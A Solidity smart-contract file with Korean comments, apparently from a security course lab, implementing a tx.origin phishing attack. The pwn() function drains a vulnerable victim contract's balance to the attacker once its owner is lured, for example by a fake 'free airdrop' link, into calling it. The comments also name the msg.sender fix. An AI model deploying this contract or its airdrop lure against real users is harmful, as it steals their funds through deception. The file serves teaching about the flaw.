// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./TxOriginVictim.sol";

/**
 * @title TxOriginAttacker
 * @dev Ch13 실습 — tx.origin 피싱 공격 컨트랙트
 *
 * 공격 시나리오:
 *   1. attacker EOA가 이 컨트랙트를 배포 (msg.sender = attacker)
 *   2. attacker가 victim owner에게 피싱 링크(예: "무료 에어드롭 받기") 발송
 *   3. victim owner가 이 컨트랙트의 pwn() 함수를 호출
 *      → tx.origin = owner (호출 체인의 최초 EOA)
 *      → victim.badWithdraw() 호출 시 require(tx.origin == owner) 통과
 *      → owner 자산이 attacker EOA 로 이체됨
 *
 * 방어: victim 컨트랙트에서 tx.origin 대신 msg.sender 사용 (TxOriginVictim.goodWithdraw)
 *
 * ⚠️  이 컨트랙트는 취약점 시연 목적으로만 사용. 실제 사용 금지.
 */
contract TxOriginAttacker {
    TxOriginVictim public victim;
    address payable public attacker;

    constructor(address _victim) {
        victim = TxOriginVictim(payable(_victim));
        attacker = payable(msg.sender);
    }

    /**
     * @dev owner가 이 함수를 호출하도록 유도(피싱):
     *      "무료 에어드롭 받기" 같은 미끼로 owner를 낚음
     *      실행 시 victim.badWithdraw가 tx.origin=owner로 통과됨
     */
    function pwn() external {
        victim.badWithdraw(attacker, address(victim).balance);
    }
}
